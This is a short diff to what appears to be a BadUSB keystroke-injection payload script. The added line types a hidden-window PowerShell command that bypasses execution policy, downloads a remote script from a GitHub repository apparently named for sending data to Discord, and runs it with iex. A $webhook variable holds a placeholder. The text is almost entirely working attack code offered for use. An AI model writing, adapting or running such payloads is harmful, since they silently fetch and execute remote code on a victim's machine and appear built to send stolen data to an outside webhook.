@@ -3,5 +3,5 @@ STRING powershell
 ENTER
 STRING $webhook = "YOUR_WEBHOOK_HERE"
 ENTER
-STRING place holder
+STRING  powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://raw.githubusercontent.com/quazi00/BAD_USB/main/trashtodiscord/SCRIPT.ps1 | iex
 ENTER
